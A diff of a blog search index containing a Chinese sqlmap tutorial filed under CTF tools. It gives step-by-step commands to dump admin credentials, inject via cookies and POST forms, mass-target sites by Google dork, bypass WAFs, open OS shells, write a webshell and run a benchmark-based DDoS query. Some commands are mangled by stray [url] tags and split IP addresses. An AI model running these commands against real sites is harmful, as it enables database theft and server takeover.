-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; </span><br><span class="line">Linux: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span><br></pre></td></tr></table></figure>
-
-<p>(2) 猜解表</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; <span class="comment">--tables </span></span><br><span class="line">Linux: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
-
-<p>(3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; <span class="comment">--columns -T admin </span></span><br><span class="line">Linux: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; <span class="comment">--columns -T admin</span></span><br></pre></td></tr></table></figure>
-
-<p>(4) 根据字段猜解内容(假如通过3得到字段为username和password)</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span> <span class="attr">--dump</span> -T admin -C <span class="string">&quot;username,password&quot;</span> </span><br><span class="line"> Linux: python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span> <span class="attr">--dump</span> -T </span><br><span class="line"> admin -C <span class="string">&quot;username,[url=]B[/url]password&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="二、SQLMAP用于Cookie注入"><a href="#二、SQLMAP用于Cookie注入" class="headerlink" title="二、SQLMAP用于Cookie注入"></a>二、SQLMAP用于Cookie注入</h2><p>(1) cookie注入，猜解表</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows:  python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.org/jsj/shownews.asp&quot; <span class="comment">--cookie &quot;id=31&quot; --table --level 2</span></span><br></pre></td></tr></table></figure>
-
-<p>(2) 猜解字段，(通过1的表猜解字段，假如表为admin)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.org/jsj/shownews.asp&quot; <span class="comment">--cookie &quot;id=31&quot; --columns -T </span></span><br><span class="line">admin <span class="comment">--level 2</span></span><br></pre></td></tr></table></figure>
-
-<p>(3) 猜解内容</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.org/jsj/shownews.asp&quot; <span class="comment">--cookie &quot;id=31&quot; --dump -T </span></span><br><span class="line">admin <span class="operator">-</span>C  &quot;username,password&quot; <span class="comment">--level 2</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="三、SQLMAP用于mysql中DDOS攻击-1-获取一个Shell"><a href="#三、SQLMAP用于mysql中DDOS攻击-1-获取一个Shell" class="headerlink" title="三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell"></a>三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.1</span> <span class="number">68.1</span> <span class="number">59.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span> [<span class="operator">/</span>url] <span class="comment">--sql</span></span><br><span class="line"><span class="operator">-</span>shell </span><br><span class="line">Linux: sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.1</span> <span class="number">68.1</span> <span class="number">59.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span> [<span class="operator">/</span>url] <span class="comment">--sql-shell</span></span><br></pre></td></tr></table></figure>
-
-<p>(2) 输入执行语句完成DDOS攻击</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> benchmark (<span class="number">99999999999</span>,<span class="number">0x70726f62616e646f70726f62616e646f70726f62616e646f</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="四、SQLMAP用于mysql注入"><a href="#四、SQLMAP用于mysql注入" class="headerlink" title="四、SQLMAP用于mysql注入"></a>四、SQLMAP用于mysql注入</h2><p>(1) 查找数据库</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/link.php?id=321&quot; <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure>
-
-<p>(2) 通过第一步的数据库查找表(假如数据库名为dataname)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/link.php?id=321&quot; <span class="operator">-</span>D dataname <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
-
-<p>(3) 通过2中的表得出列名(假如表为table_name)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/link.php?id=321&quot; <span class="operator">-</span>D dataname <span class="operator">-</span>T table_name <span class="comment">--columns</span></span><br></pre></td></tr></table></figure>
-
-<p>(4) 获取字段的值(假如扫描出id,user,password字段)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/link.php?id=321&quot; <span class="operator">-</span>D dataname <span class="operator">-</span>T table_name <span class="operator">-</span>C &quot;id,user,password&quot; <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="五、SQLMAP中post登陆框注入"><a href="#五、SQLMAP中post登陆框注入" class="headerlink" title="五、SQLMAP中post登陆框注入"></a>五、SQLMAP中post登陆框注入</h2><p>(1) 其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件</p>
-<blockquote>
-<p>我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。</p>
-</blockquote>
-<ol>
-<li><p>浏览器打开目标地址http:&#x2F;&#x2F; <a href="http://www.xxx.com/">www.xxx.com</a> &#x2F;Login.asp</p>
-</li>
-<li><p>配置burp代理(127.0.0.1:8080)以拦截请求</p>
-</li>
-<li><p>点击login表单的submit按钮</p>
-</li>
-<li><p>这时候Burp会拦截到了我们的登录POST请求</p>
-</li>
-<li><p>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</p>
-</li>
-<li><p>运行sqlmap并使用如下命令：</p>
-</li>
-</ol>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span><span class="operator">/</span>sqlmap.py  <span class="operator">-</span> r <span class="keyword">search</span> <span class="operator">-</span> test.txt  <span class="operator">-</span> p tfUPass</span><br></pre></td></tr></table></figure>
-
-<p>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。</p>
-<p>注入点：<a href="http://testasp.vulnweb.com/Login.asp">http://testasp.vulnweb.com/Login.asp</a></p>
-<p>几种注入方式：.&#x2F;sqlmap.py -r search-test.txt -p tfUPass</p>
-<p>(2) 自动的搜索</p>
-<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">sqlmap -u [url]<span class="link">http://testasp.vulnweb.com/Login.asp</span>[<span class="string">/url</span>] --forms</span><br></pre></td></tr></table></figure>
-
-<p>(3) 指定参数搜索</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span>testasp.vulnweb.com<span class="operator">/</span>Login.asp[<span class="operator">/</span>url] <span class="comment">--data &quot;tfUName=321&amp;tfUPass=321&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="六、SQLMAP中Google搜索注入"><a href="#六、SQLMAP中Google搜索注入" class="headerlink" title="六、SQLMAP中Google搜索注入"></a>六、SQLMAP中Google搜索注入</h2><p>inurl后面的语言是由自己定的</p>
-<p>注入过程中如果选y是注入，如果不是选n</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>g inurl:php?id<span class="operator">=</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="七、SQLMAP中的请求延迟"><a href="#七、SQLMAP中的请求延迟" class="headerlink" title="七、SQLMAP中的请求延迟"></a>七、SQLMAP中的请求延迟</h2><p>参数 –delay –safe-freq</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="comment">--dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --delay 1 python sqlmap.py --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --safe-freq 3</span></span><br></pre></td></tr></table></figure>
-
-<p>参数</p>
-<h2 id="八、SQLMAP绕过WAF防火墙"><a href="#八、SQLMAP绕过WAF防火墙" class="headerlink" title="八、SQLMAP绕过WAF防火墙"></a>八、SQLMAP绕过WAF防火墙</h2><p>注入点:<a href="http://192.168.159.1/news.php?id=1">http://192.168.159.1/news.php?id=1</a></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.1</span> <span class="number">68.1</span> <span class="number">59.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span> [<span class="operator">/</span>url] <span class="operator">-</span>v <span class="number">3</span> <span class="comment">--dbs --batch --tamper &quot;space2morehash.py&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py</p>
-<p>都是编码方式</p>
-<p>space2hash.py base64encode.py charencode.py</p>
-<h2 id="九、SQLMAP查看权限"><a href="#九、SQLMAP查看权限" class="headerlink" title="九、SQLMAP查看权限"></a>九、SQLMAP查看权限</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.1</span> <span class="number">68.1</span> <span class="number">59.1</span><span class="operator">/</span>news.php? id<span class="operator">=</span><span class="number">1</span> [<span class="operator">/</span>url] <span class="comment">--privileges</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="十、SQLMAP伪静态注入-1-查找数据库"><a href="#十、SQLMAP伪静态注入-1-查找数据库" class="headerlink" title="十、SQLMAP伪静态注入(1) 查找数据库"></a>十、SQLMAP伪静态注入(1) 查找数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure>
-
-<p>(2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; <span class="operator">-</span>D dataname <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
-
-<p>(3) 通过2中的数据表得到字段(假如得到的是tablename表)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; <span class="operator">-</span>D dataname <span class="operator">-</span>T tablename <span class="comment">--columns</span></span><br></pre></td></tr></table></figure>
-
-<p>(4) 通过3得到字段值(假如从3中得到字段id，password)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; <span class="operator">-</span>D dataname <span class="operator">-</span>T tablename <span class="operator">-</span>C &quot;password&quot; <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="十一、SQLMAP注入点执行命令与交互写shell"><a href="#十一、SQLMAP注入点执行命令与交互写shell" class="headerlink" title="十一、SQLMAP注入点执行命令与交互写shell"></a>十一、SQLMAP注入点执行命令与交互写shell</h2><p>(1) 注入点：<a href="http://192.168.159.1/news.php?id=1">http://192.168.159.1/news.php?id=1</a></p>
-<p>此处采用的是Linux系统</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.159</span><span class="number">.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span>[<span class="operator">/</span>url] <span class="comment">--os-cmd=ipconfig</span></span><br></pre></td></tr></table></figure>
-
-<p>出现语言的选择根据实际的测试网站选择语言</p>
-<p>指定目标站点D:&#x2F;www&#x2F;</p>
-<p>(2) 获取Shell</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.159</span><span class="number">.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span>[<span class="operator">/</span>url] <span class="comment">--os-shell</span></span><br></pre></td></tr></table></figure>
-
-<p>出现语言的选择根据实际的测试网站选择语言</p>
-<p>指定目标站点D:&#x2F;www&#x2F;</p>
-<p>输入ipconfig&#x2F;all</p>
-<p>创建用户和删除用户</p>
-<p>只要权限足够大，你可以输入使用任何命令。</p>
-<p>其他命令参考下面：</p>
-<p>从数据库中搜索字段</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>r &quot;c:\tools\request.txt&quot; <span class="operator">-</span>dbms mysql <span class="operator">-</span>D dedecms <span class="operator">-</span><span class="keyword">search</span> <span class="operator">-</span>C admin,password</span><br></pre></td></tr></table></figure>
-
-<p>在dedecms数据库中搜索字段admin或者password。</p>
-<p>读取与写入文件</p>
-<p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
-<p>-file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</p>
-<p>-file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p>
-<p>-file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</p>
-<p>#示例：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>r &quot;c: \request.txt&quot;  <span class="operator">-</span>p id <span class="operator">-</span>dbms mysql <span class="operator">-</span>file<span class="operator">-</span>dest &quot;e:\php\htdocs\dvwa\inc\include\1. php&quot; <span class="operator">-</span>file <span class="operator">-</span>write &quot;f:\webshell\1112.php&quot;</span><br></pre></td></tr></table></figure>
-
-<p>使用shell命令：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>r &quot;c : \tools\request.txt&quot; <span class="operator">-</span>p id <span class="operator">-</span>dms mysql <span class="operator">-</span>os<span class="operator">-</span>shell</span><br></pre></td></tr></table></figure>
-
-<p>接下来指定网站可写目录：</p>
-<p>“E:\php\htdocs\dvwa”</p>
-<p>#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p>
-<p>sqlmap详细命令：</p>
-<ul>
-<li>-is-dba 当前用户权限（是否为root权限）</li>
-<li>-dbs 所有数据库</li>
-<li>-current-db 网站当前数据库</li>
-<li>-users 所有数据库用户</li>
-<li>-current-user 当前数据库用户</li>
-<li>-random-agent 构造随机user-agent</li>
-<li>-passwords 数据库密码</li>
-<li>-proxy <a href="http://local:8080/">http://local:8080</a> -threads 10 (可以自定义线程加速) 代理</li>
-<li>-time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
-</ul>
-<p>Options（选项）：</p>
-<ul>
-<li>-version 显示程序的版本号并退出</li>
-<li>-h, -help 显示此帮助消息并退出</li>
-<li>-v VERBOSE 详细级别：0-6（默认为1）</li>
-</ul>
-<p>Target（目标）：</p>
-<p>以下至少需要设置其中一个选项，设置目标URL。</p>
-<ul>
-<li>-d DIRECT 直接连接到数据库。</li>
-<li>-u URL, -url&#x3D;URL 目标URL。</li>
-<li>-l LIST 从Burp或WebScarab代理的日志中解析目标。</li>
-<li>-r REQUESTFILE 从一个文件中载入HTTP请求。</li>
-<li>-g GOOGLEDORK 处理Google dork的结果作为目标URL。</li>
-<li>-c CONFIGFILE 从INI配置文件中加载选项。</li>
-</ul>
-<p>Request（请求）：</p>
-<p>这些选项可以用来指定如何连接到目标URL。</p>
-<ul>
-<li>-data&#x3D;DATA 通过POST发送的数据字符串</li>
-<li>-cookie&#x3D;COOKIE HTTP Cookie头</li>
-<li>-cookie-urlencode URL 编码生成的cookie注入</li>
-<li>-drop-set-cookie 忽略响应的Set - Cookie头信息</li>
-<li>-user-agent&#x3D;AGENT 指定 HTTP User - Agent头</li>
-<li>-random-agent 使用随机选定的HTTP User - Agent头</li>
-<li>-referer&#x3D;REFERER 指定 HTTP Referer头</li>
-<li>-headers&#x3D;HEADERS 换行分开，加入其他的HTTP头</li>
-<li>-auth-type&#x3D;ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)</li>
-<li>-auth-cred&#x3D;ACRED HTTP身份验证凭据（用户名:密码）</li>
-<li>-auth-cert&#x3D;ACERT HTTP认证证书（key_file，cert_file）</li>
-<li>-proxy&#x3D;PROXY 使用HTTP代理连接到目标URL</li>
-<li>-proxy-cred&#x3D;PCRED HTTP代理身份验证凭据（用户名：密码）</li>
-<li>-ignore-proxy 忽略系统默认的HTTP代理</li>
-<li>-delay&#x3D;DELAY 在每个HTTP请求之间的延迟时间，单位为秒</li>
-<li>-timeout&#x3D;TIMEOUT 等待连接超时的时间（默认为30秒）</li>
-<li>-retries&#x3D;RETRIES 连接超时后重新连接的时间（默认3）</li>
-<li>-scope&#x3D;SCOPE 从所提供的代理日志中过滤器目标的正则表达式</li>
-<li>-safe-url&#x3D;SAFURL 在测试过程中经常访问的url地址</li>
-<li>-safe-freq&#x3D;SAFREQ 两次访问之间测试请求，给出安全的URL</li>
-</ul>
-<p>Enumeration（枚举）：</p>
-<p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。</p>
-<ul>
-<li>-b, -banner 检索数据库管理系统的标识</li>
-<li>-current-user 检索数据库管理系统当前用户</li>
-<li>-current-db 检索数据库管理系统当前数据库</li>
-<li>-is-dba 检测DBMS当前用户是否DBA</li>
-<li>-users 枚举数据库管理系统用户</li>
-<li>-passwords 枚举数据库管理系统用户密码哈希</li>
-<li>-privileges 枚举数据库管理系统用户的权限</li>
-<li>-roles 枚举数据库管理系统用户的角色</li>
-<li>-dbs 枚举数据库管理系统数据库</li>
-<li>-D DBname 要进行枚举的指定数据库名</li>
-<li>-T TBLname 要进行枚举的指定数据库表（如：-T tablename -columns）</li>
-<li>-tables 枚举的DBMS数据库中的表</li>
-<li>-columns 枚举DBMS数据库表列</li>
-<li>-dump 转储数据库管理系统的数据库中的表项</li>
-<li>-dump-all 转储所有的DBMS数据库表中的条目</li>
-<li>-search 搜索列（S），表（S）和&#x2F;或数据库名称（S）</li>
-<li>-C COL 要进行枚举的数据库列</li>
-<li>-U USER 用来进行枚举的数据库用户</li>
-<li>-exclude-sysdbs 枚举表时排除系统数据库</li>
-<li>-start&#x3D;LIMITSTART 第一个查询输出进入检索</li>
-<li>-stop&#x3D;LIMITSTOP 最后查询的输出进入检索</li>
-<li>-first&#x3D;FIRSTCHAR 第一个查询输出字的字符检索</li>
-<li>-last&#x3D;LASTCHAR 最后查询的输出字字符检索</li>
-<li>-sql-query&#x3D;QUERY 要执行的SQL语句</li>
-<li>-sql-shell 提示交互式SQL的shell</li>
-</ul>
-<p>Optimization（优化）：</p>
-<p>这些选项可用于优化SqlMap的性能。</p>
-<ul>
-<li>-o 开启所有优化开关</li>
-<li>-predict-output 预测常见的查询输出</li>
-<li>-keep-alive 使用持久的HTTP（S）连接</li>
-<li>-null-connection 从没有实际的HTTP响应体中检索页面长度</li>
-<li>-threads&#x3D;THREADS 最大的HTTP（S）请求并发量（默认为1）</li>
-</ul>
-<p>Injection（注入）：</p>
-<p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p>
-<ul>
-<li>-p TESTPARAMETER 可测试的参数（S）</li>
-<li>-dbms&#x3D;DBMS 强制后端的DBMS为此值</li>
-<li>-os&#x3D;OS 强制后端的DBMS操作系统为这个值</li>
-<li>-prefix&#x3D;PREFIX 注入payload字符串前缀</li>
-<li>-suffix&#x3D;SUFFIX 注入payload字符串后缀</li>
-<li>-tamper&#x3D;TAMPER 使用给定的脚本（S）篡改注入数据</li>
-</ul>
-<p>Detection（检测）：</p>
-<p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p>
-<ul>
-<li>-level&#x3D;LEVEL 执行测试的等级（1-5，默认为1）</li>
-<li>-risk&#x3D;RISK 执行测试的风险（0-3，默认为1）</li>
-<li>-string&#x3D;STRING 查询时有效时在页面匹配字符串</li>
-<li>-regexp&#x3D;REGEXP 查询时有效时在页面匹配正则表达式</li>
-<li>-text-only 仅基于在文本内容比较网页</li>
-</ul>
-<p>Techniques（技巧）：</p>
-<p>这些选项可用于调整具体的SQL注入测试。</p>
-<ul>
-<li>-technique&#x3D;TECH SQL注入技术测试（默认BEUST）</li>
-<li>-time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
-<li>-union-cols&#x3D;UCOLS 定列范围用于测试UNION查询注入</li>
-<li>-union-char&#x3D;UCHAR 用于暴力猜解列数的字符</li>
-</ul>
-<p>Fingerprint（指纹）：</p>
-<ul>
-<li>-f, -fingerprint 执行检查广泛的DBMS版本指纹</li>
-</ul>
-<p>Brute force（蛮力）：</p>
-<p>这些选项可以被用来运行蛮力检查。</p>
-<ul>
-<li>-common-tables 检查存在共同表</li>
-<li>-common-columns 检查存在共同列</li>
-</ul>
-<p>User-defined function injection（用户自定义函数注入）：</p>
-<p>这些选项可以用来创建用户自定义函数。</p>
-<p>-udf-inject 注入用户自定义函数</p>
-<p>-shared-lib&#x3D;SHLIB 共享库的本地路径</p>
-<p>File system access（访问文件系统）：</p>
-<p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
-<ul>
-<li>-file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件</li>
-<li>-file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件</li>
-<li>-file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</li>
-</ul>
-<p>Operating system access（操作系统访问）：</p>
-<p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
-<ul>
-<li>-os-cmd&#x3D;OSCMD 执行操作系统命令</li>
-<li>-os-shell 交互式的操作系统的shell</li>
-<li>-os-pwn 获取一个OOB shell，meterpreter或VNC</li>
-<li>-os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</li>
-<li>-os-bof 存储过程缓冲区溢出利用</li>
-<li>-priv-esc 数据库进程用户权限提升</li>
-<li>-msf-path&#x3D;MSFPATH Metasploit Framework本地的安装路径</li>
-<li>-tmp-path&#x3D;TMPPATH 远程临时文件目录的绝对路径</li>
-</ul>
-<p>Windows注册表访问：</p>
-<p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p>
-<ul>
-<li>-reg-read 读一个Windows注册表项值</li>
-<li>-reg-add 写一个Windows注册表项值数据</li>
-<li>-reg-del 删除Windows注册表键值</li>
-<li>-reg-key&#x3D;REGKEY Windows注册表键</li>
-<li>-reg-value&#x3D;REGVAL Windows注册表项值</li>
-<li>-reg-data&#x3D;REGDATA Windows注册表键值数据</li>
-<li>-reg-type&#x3D;REGTYPE Windows注册表项值类型</li>
-<li>这些选项可以用来设置一些一般的工作参数。</li>
-<li>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中</li>
-<li>-s SESSIONFILE 保存和恢复检索会话文件的所有数据</li>
-<li>-flush-session 刷新当前目标的会话文件</li>
-<li>-fresh-queries 忽略在会话文件中存储的查询结果</li>
-<li>-eta 显示每个输出的预计到达时间</li>
-<li>-update 更新SqlMap</li>
-<li>-save file保存选项到INI配置文件</li>
-<li>-batch 从不询问用户输入，使用所有默认配置。</li>
-</ul>
-<p>Miscellaneous（杂项）：</p>
-<ul>
-<li>-beep 发现SQL注入时提醒</li>
-<li>-check-payload IDS对注入payloads的检测测试</li>
-<li>-cleanup SqlMap具体的UDF和表清理DBMS</li>
-<li>-forms 对目标URL的解析和测试形式</li>
-<li>-gpage&#x3D;GOOGLEPAGE 从指定的页码使用谷歌dork结果</li>
-<li>-page-rank Google dork结果显示网页排名（PR）</li>
-<li>-parse-errors 从响应页面解析数据库管理系统的错误消息</li>
-<li>-replicate 复制转储的数据到一个sqlite3数据库</li>
-<li>-tor 使用默认的Tor（Vidalia&#x2F; Privoxy&#x2F; Polipo）代理地址</li>
-<li>-wizard 给初级用户的简单向导界面</li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF_Tools</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -1257,18 +920,340 @@
       </tags>
   </entry>
   <entry>
-    <title>关于建站</title>
-    <url>/2023/11/05/%E5%85%B3%E4%BA%8E%E5%BB%BA%E7%AB%99/</url>
-    <content><![CDATA[<p>作为学生党，搭建博客的时候最优先考虑的就是钱，为了搭建一个性价比最高的博客，我尝试了很多图床</p>
-<p>使用cloudflare R2搭建图床:<a href="https://testerhome.com/topics/36077">https://testerhome.com/topics/36077</a></p>
-<p>使用cloudflare+backblaze_b2搭建图床:<a href="https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80">https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80</a></p>
+    <title>SQLmap使用</title>
+    <url>/2023/10/29/SQLmap%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="一、SQLMAP用于Access数据库注入"><a href="#一、SQLMAP用于Access数据库注入" class="headerlink" title="一、SQLMAP用于Access数据库注入"></a>一、SQLMAP用于Access数据库注入</h2><p>(1) 猜解是否能注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; </span><br><span class="line">Linux: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span><br></pre></td></tr></table></figure>
+
+<p>(2) 猜解表</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; <span class="comment">--tables </span></span><br><span class="line">Linux: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
+
+<p>(3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; <span class="comment">--columns -T admin </span></span><br><span class="line">Linux: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; <span class="comment">--columns -T admin</span></span><br></pre></td></tr></table></figure>
+
+<p>(4) 根据字段猜解内容(假如通过3得到字段为username和password)</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span> <span class="attr">--dump</span> -T admin -C <span class="string">&quot;username,password&quot;</span> </span><br><span class="line"> Linux: python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span> <span class="attr">--dump</span> -T </span><br><span class="line"> admin -C <span class="string">&quot;username,[url=]B[/url]password&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="二、SQLMAP用于Cookie注入"><a href="#二、SQLMAP用于Cookie注入" class="headerlink" title="二、SQLMAP用于Cookie注入"></a>二、SQLMAP用于Cookie注入</h2><p>(1) cookie注入，猜解表</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows:  python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.org/jsj/shownews.asp&quot; <span class="comment">--cookie &quot;id=31&quot; --table --level 2</span></span><br></pre></td></tr></table></figure>
+
+<p>(2) 猜解字段，(通过1的表猜解字段，假如表为admin)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.org/jsj/shownews.asp&quot; <span class="comment">--cookie &quot;id=31&quot; --columns -T </span></span><br><span class="line">admin <span class="comment">--level 2</span></span><br></pre></td></tr></table></figure>
+
+<p>(3) 猜解内容</p>
